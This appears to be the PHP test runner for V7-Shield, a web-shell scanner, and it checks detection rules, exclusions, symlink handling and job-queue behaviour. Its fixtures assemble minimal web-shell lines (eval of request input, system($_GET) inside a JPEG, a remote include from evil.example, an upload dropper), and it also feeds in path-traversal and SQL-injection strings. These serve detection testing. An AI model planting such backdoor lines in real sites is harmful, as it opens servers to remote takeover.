<?php
/**
 * V7-Shield test runner (no external dependencies).
 *
 *   php backend/tests/run.php
 *
 * Database tests run only when V7SHIELD_TEST_DSN, V7SHIELD_TEST_USER and
 * V7SHIELD_TEST_PASS are set and the database name contains "test".
 * Fixtures are generated in a temporary directory; suspicious samples are
 * assembled from fragments so no malware-like files are committed.
 */
declare(strict_types=1);

require dirname(__DIR__) . '/bootstrap.php';

use V7Shield\Config;
use V7Shield\Repository\ScanRepository;
use V7Shield\Scanner\FileWalker;
use V7Shield\Scanner\Scanner;
use V7Shield\Scanner\ScanSink;
use V7Shield\Service\ScanService;
use V7Shield\ServiceException;

$passed = 0;
$failed = 0;
function check(string $name, bool $ok, string $info = ''): void
{
    global $passed, $failed;
    $ok ? $passed++ : $failed++;
    echo ($ok ? "  \033[32mPASS\033[0m " : "  \033[31mFAIL\033[0m ") . $name . ($ok || $info === '' ? '' : " — $info") . PHP_EOL;
}

final class MemorySink implements ScanSink
{
    public array $findings = [];
    public array $skips = [];
    public function finding(array $finding): void { $this->findings[] = $finding; }
    public function skipped(string $path, string $reason, string $detail): void { $this->skips[$path] = $reason; }
    public function progress(array $stats): void {}
    public function rules(string $path): array { return array_values(array_unique(array_column(array_filter($this->findings, fn($f) => $f['file_path'] === $path), 'rule_id'))); }
}

function rrmdir(string $d): void
{
    if (!file_exists($d) && !is_link($d)) { return; }
    if (is_link($d) || is_file($d)) { @chmod($d, 0644); unlink($d); return; }
    @chmod($d, 0755);
    foreach (scandir($d) as $f) { if ($f !== '.' && $f !== '..') { rrmdir("$d/$f"); } }
    rmdir($d);
}

$tmp = sys_get_temp_dir() . '/v7shield-tests-' . bin2hex(random_bytes(4));
$root = "$tmp/site";
$outside = "$tmp/outside";
mkdir("$root/uploads/2026", 0755, true);
mkdir("$root/deep/a/b/c/d", 0755, true);
mkdir("$root/node_modules/pkg", 0755, true);
mkdir("$root/empty-dir", 0755, true);
mkdir($outside, 0755, true);
register_shutdown_function(fn() => rrmdir($tmp));

$o = '<' . '?php ';
$ev = 'ev' . 'al';
$files = [
    // Clean files
    'index.php' => $o . "echo 'Hello';\nfunction add(int \$a, int \$b): int { return \$a + \$b; }\n",
    'about.html' => "<html><body><h1>About</h1></body></html>\n",
    'logo.png' => "\x89PNG\r\n\x1A\n" . str_repeat("\0", 64),
    'photo.jpg' => "\xFF\xD8\xFF\xE0" . str_repeat("\x10", 64),
    'style.css' => "body { color: #333; }\n",
    'config.xml' => "<?xml version=\"1.0\"?><config/>\n",
    // Suspicious fixtures
    'uploads/2026/cache.php' => $o . "\n\n" . $ev . '(base' . '64_decode("ZWNobyAxOw=="));',
    'uploads/2026/avatar.jpg' => "\xFF\xD8\xFF\xE0" . $o . 'sys' . 'tem($_GET["c"]);',
    'uploads/fake.png' => "GIF89a not a png",
    'shell.php' => $o . '$_POST["f"]($_POST["a"]);',
    'inc.php' => $o . 'include $_GET["page"];',
    'remote.php' => $o . 'require "http' . '://evil.example/x.txt";',
    'dropper.php' => $o . 'file_put_contents("x.php", $_POST["d"]);',
    'packed.php' => $o . '$x = "' . str_repeat('QUJD', 400) . '";',
    'hex.php' => $o . '$f = "' . str_repeat('\\x41', 40) . '";',
    'chr.php' => $o . '$f = ' . str_repeat('chr(65).', 9) . '"";',
    'legacy.php' => $o . '$f = create_' . 'function(\'$a\', \'return $a;\');',
    'pregx.php' => $o . 'preg_replace("/x/e", $r, $s);',
    'marker.php' => $o . '// Files' . 'Man panel',
    'tpl.phtml' => "<h1><?= \$title ?></h1>\n",
    'tool.jpg' => "\x7FELF" . str_repeat("\0", 60),
    '.hidden.php' => $o . $ev . '($_REQUEST["x"]);',
    'node_modules/pkg/evil.php' => $o . $ev . '($_GET["x"]);',
    'debug.log' => $o . $ev . '($_GET["x"]);',
    'deep/a/b/c/d/deep.php' => $o . $ev . '($_GET["x"]);',
    'empty.php' => '',
    'big.php' => $o . str_repeat('/* padding */', 20000),
];
foreach ($files as $p => $c) {
    file_put_contents("$root/$p", $c);
}
file_put_contents("$outside/secret.php", $o . $ev . '($_GET["x"]);');
symlink("$outside/secret.php", "$root/link.php");
symlink($outside, "$root/linkdir");
$unreadable = "$root/locked.php";
file_put_contents($unreadable, $o . 'echo 1;');
chmod($unreadable, 0000);
$runningAsRoot = function_exists('posix_geteuid') && posix_geteuid() === 0;

$rulesCfg = require dirname(__DIR__) . '/config/rules.php';
$limits = ['max_file_size' => 100 * 1024, 'max_depth' => 3, 'max_files' => 1000, 'max_duration' => 60, 'max_findings_per_file' => 20];
$scanner = new Scanner(new V7Shield\Scanner\RuleEngine($rulesCfg), $rulesCfg['builtin'], $limits);

$before = [];
foreach (new RecursiveIteratorIterator(new RecursiveDirectoryIterator($root, FilesystemIterator::SKIP_DOTS)) as $f) {
    if (!$f->isLink() && $f->isReadable()) { $before[$f->getPathname()] = [md5_file($f->getPathname()), $f->getMTime()]; }
}

echo "Scanner\n";
$sink = new MemorySink();
$walker = new FileWalker($root, ['node_modules/', '*.log'], $limits['max_depth']);
$stats = $scanner->scan($walker, $sink);

foreach (['index.php', 'about.html', 'logo.png', 'photo.jpg', 'style.css', 'config.xml'] as $clean) {
    check("clean file has no findings: $clean", $sink->rules($clean) === [], implode(',', $sink->rules($clean)));
}
$expect = [
    'uploads/2026/cache.php' => 'V7-OBF-001', 'uploads/2026/avatar.jpg' => 'V7-SIG-001', 'uploads/fake.png' => 'V7-SIG-002',
    'shell.php' => 'V7-EXEC-003', 'inc.php' => 'V7-RCE-001', 'remote.php' => 'V7-RCE-002', 'dropper.php' => 'V7-WS-002',
    'packed.php' => 'V7-OBF-003', 'hex.php' => 'V7-OBF-004', 'chr.php' => 'V7-OBF-005', 'legacy.php' => 'V7-EXEC-005',
    'pregx.php' => 'V7-EXEC-004', 'marker.php' => 'V7-WS-001', 'tpl.phtml' => 'V7-FS-001', 'tool.jpg' => 'V7-SIG-003',
    '.hidden.php' => 'V7-EXEC-001',
];
foreach ($expect as $file => $rule) {
    check("detects $rule in $file", in_array($rule, $sink->rules($file), true), 'got: ' . implode(',', $sink->rules($file)));
}
check('image with PHP also matches command-execution rule', in_array('V7-EXEC-002', $sink->rules('uploads/2026/avatar.jpg'), true));
check('every finding is classified "suspicious"', array_unique(array_column($sink->findings, 'classification')) === ['suspicious']);
check('every finding has rule id, severity, confidence and sha256', array_reduce($sink->findings, fn($ok, $f) => $ok && $f['rule_id'] && isset(Scanner::SEVERITY_RANK[$f['severity']]) && $f['confidence'] > 0 && strlen($f['file_sha256']) === 64, true));
check('line number reported (cache.php line 3)', ($sink->findings[array_search('uploads/2026/cache.php', array_column($sink->findings, 'file_path'))]['line'] ?? 0) === 3);
$packed = array_values(array_filter($sink->findings, fn($f) => $f['file_path'] === 'packed.php'))[0]['evidence'] ?? '';
check('evidence is truncated (no full payload stored)', mb_strlen($packed) <= 170 && !str_contains($packed, str_repeat('QUJD', 20)), "len=" . mb_strlen($packed));

check('excluded directory is skipped', ($sink->skips['node_modules/'] ?? '') === 'excluded');
check('excluded glob is skipped', ($sink->skips['debug.log'] ?? '') === 'excluded');
check('excluded files produce no findings', $sink->rules('node_modules/pkg/evil.php') === [] && $sink->rules('debug.log') === []);
check('symlinked file is skipped, not followed', ($sink->skips['link.php'] ?? '') === 'symlink' && $sink->rules('link.php') === []);
check('symlinked directory is skipped (no escape)', ($sink->skips['linkdir'] ?? '') === 'symlink' && !array_filter(array_column($sink->findings, 'file_path'), fn($p) => str_starts_with($p, 'linkdir')));
check('directory beyond max_depth is skipped', ($sink->skips['deep/a/b/c/'] ?? '') === 'max_depth');
check('oversized file is skipped', ($sink->skips['big.php'] ?? '') === 'oversized');
check('empty file is skipped as empty', ($sink->skips['empty.php'] ?? '') === 'empty');
if ($runningAsRoot) {
    echo "  SKIP unreadable-file test (running as root)\n";
} else {
    check('unreadable file is reported', ($sink->skips['locked.php'] ?? '') === 'unreadable');
    check('unreadable file counted as error', $stats['errors'] >= 1);
}
check('empty directory scans without error', (function () use ($scanner, $root) {
    $s = new MemorySink();
    $r = $scanner->scan(new FileWalker("$root/empty-dir", [], 5), $s);
    return $r['files_scanned'] === 0 && $r['errors'] === 0 && $s->findings === [];
})());
check('max_files limit stops the scan and is reported', (function () use ($rulesCfg, $limits, $root) {
    $sc = new Scanner(new V7Shield\Scanner\RuleEngine($rulesCfg), $rulesCfg['builtin'], ['max_files' => 3] + $limits);
    $r = $sc->scan(new FileWalker($root, [], 3), new MemorySink());
    return $r['limit_reached'] === 'max_files' && $r['files_scanned'] === 3;
})());

check('regex limit on one rule is reported, not fatal', (function () use ($rulesCfg, $limits, $tmp) {
    mkdir("$tmp/redos");
    file_put_contents("$tmp/redos/x.php", '<' . '?php ' . str_repeat('a', 5000));
    $cfg = $rulesCfg;
    $cfg['rules'][] = ['id' => 'T-REDOS', 'name' => 't', 'category' => 'execution', 'severity' => 'low', 'confidence' => 1, 'pattern' => '~(a+)+b~'];
    $oldLimit = ini_set('pcre.backtrack_limit', '1000');
    $oldJit = ini_set('pcre.jit', '0');
    $s = new MemorySink();
    $r = (new Scanner(new V7Shield\Scanner\RuleEngine($cfg), $cfg['builtin'], $limits))->scan(new FileWalker("$tmp/redos", [], 3), $s);
    ini_set('pcre.backtrack_limit', (string) $oldLimit);
    ini_set('pcre.jit', (string) $oldJit);
    return $r['files_scanned'] === 1 && $r['errors'] === 1 && ($s->skips['x.php'] ?? '') === 'rule_error';
})());

$after = [];
foreach (array_keys($before) as $p) { $after[$p] = [md5_file($p), filemtime($p)]; }
check('scan is read-only: no file content or mtime changed', $before === $after);
check('scan root that does not exist is rejected', (function () { try { new FileWalker('/nonexistent/' . bin2hex(random_bytes(3)), [], 3); return false; } catch (V7Shield\Scanner\ScanException) { return true; } })());

echo "Target resolution\n";
$cfgFile = "$tmp/config.local.php";
file_put_contents($cfgFile, '<?php return ' . var_export([
    'targets' => ['site' => ['label' => 'Test site', 'path' => $root], 'gone' => ['label' => 'Missing', 'path' => "$tmp/missing"]],
], true) . ';');
putenv("V7SHIELD_CONFIG=$cfgFile");
$config = Config::load(dirname(__DIR__) . '/config');
$rejects = function (string $id) use ($config): bool {
    try { ScanService::resolveConfiguredTarget($config, $id); return false; } catch (ServiceException) { return true; }
};
check('configured target resolves to real path', ScanService::resolveConfiguredTarget($config, 'site')['path'] === realpath($root));
foreach (['../etc', '/etc', 'site/../../', 'site%00', '', 'unknown', str_repeat('a', 65)] as $bad) {
    check('rejects target id ' . json_encode($bad), $rejects($bad));
}
check('rejects target whose directory is missing', $rejects('gone'));

// ---------------------------------------------------------------- database
$dsn = getenv('V7SHIELD_TEST_DSN');
if (!$dsn) {
    echo "Database tests skipped (set V7SHIELD_TEST_DSN / _USER / _PASS)\n";
} elseif (!str_contains((string) $dsn, 'test')) {
    echo "Database tests refused: V7SHIELD_TEST_DSN must point to a database whose name contains 'test'.\n";
    $failed++;
} else {
    echo "Database\n";
    file_put_contents($cfgFile, '<?php return ' . var_export([
        'database' => ['dsn' => $dsn, 'username' => getenv('V7SHIELD_TEST_USER'), 'password' => getenv('V7SHIELD_TEST_PASS')],
        'targets' => ['site' => ['label' => 'Test site', 'path' => $root]],
        'scanner' => ['max_file_size' => 100 * 1024, 'max_depth' => 3, 'exclusions' => ['node_modules/', '*.log']],
        'jobs' => ['max_starts_per_hour' => 3],
    ], true) . ';');
    $config = Config::load(dirname(__DIR__) . '/config');
    $pdo = V7Shield\Database::connect($config);
    $pdo->exec('DELETE FROM scan_jobs');
    $repo = new ScanRepository($pdo);
    $svc = new ScanService($config, $repo);

    $id = $svc->start('site', 'tester', '127.0.0.1');
    check('start creates a queued job', $svc->status($id)['status'] === 'queued');
    $dup = null;
    try { $svc->start('site', 'tester', null); } catch (ServiceException $e) { $dup = $e->status(); }
    check('second start for same target while queued is rejected (409)', $dup === 409);
    check('run completes the job', $svc->run($id) === true && $svc->status($id)['status'] === 'completed');
    check('repeated run is a no-op', $svc->run($id) === false);
    $st = $svc->status($id);
    check('counts persisted', $st['files_scanned'] > 10 && $st['findings_count'] === count($sink->findings) && $st['critical'] > 0, json_encode([$st['files_scanned'], $st['findings_count'], count($sink->findings)]));
    check('skip reasons persisted', isset($st['skip_reasons']['symlink'], $st['skip_reasons']['excluded'], $st['skip_reasons']['oversized']));
    $page = $svc->findings($id, ['severity' => 'critical'], 1);
    check('findings filter by severity', $page['total'] > 0 && array_unique(array_column($page['items'], 'severity')) === ['critical']);
    check('findings filter ignores invalid values', $svc->findings($id, ['severity' => "x' OR 1=1"], 1)['total'] === $st['findings_count']);
    check('findings search is literal (LIKE wildcards escaped)', $svc->findings($id, ['q' => '%'], 1)['total'] === 0);
    check('public job contains no absolute path or IP', !str_contains(json_encode($st), $root) && !array_key_exists('requested_ip', $st));
    check('public findings contain only relative paths', !str_contains(json_encode($page), $tmp));
    check('history lists the job', $svc->history(1, null)['items'][0]['id'] === $id);
    check('summary uses the completed job', $svc->summary()['latest']['id'] === $id);
    // One job already counts towards the limit of 3; create two more, then expect rejection.
    $rate = null;
    $created = 1;
    try {
        for ($i = 0; $i < 3; $i++) {
            $svc->start('site', 'tester', null);
            $created++;
            $repo->pdo()->exec("UPDATE scan_jobs SET status = 'completed' WHERE status = 'queued'");
        }
    } catch (ServiceException $e) { $rate = $e->status(); }
    check('rate limit enforced after max_starts_per_hour (429)', $rate === 429 && $created === 3, "created=$created status=" . var_export($rate, true));
    $other = $svc->start('site', 'someone-else', null);
    check('rate limit is per user', $other > 0);
    $repo->pdo()->exec("UPDATE scan_jobs SET status = 'completed' WHERE status = 'queued'");
    $stale = $repo->createJob('site', 'Test', 'other', null, 'x', []);
    $pdo->exec("UPDATE scan_jobs SET status = 'running', started_at = UTC_TIMESTAMP() - INTERVAL 2 HOUR, heartbeat_at = UTC_TIMESTAMP() - INTERVAL 2 HOUR WHERE id = $stale");
    $svc->history(1, null);
    check('stale running job is marked failed', $svc->status($stale)['status'] === 'failed');
    $nf = null;
    try { $svc->status(999999); } catch (ServiceException $e) { $nf = $e->status(); }
    check('unknown scan id returns 404', $nf === 404);
    $pdo->exec('DELETE FROM scan_jobs');
}

echo PHP_EOL . "$passed passed, $failed failed" . PHP_EOL;
exit($failed > 0 ? 1 : 0);
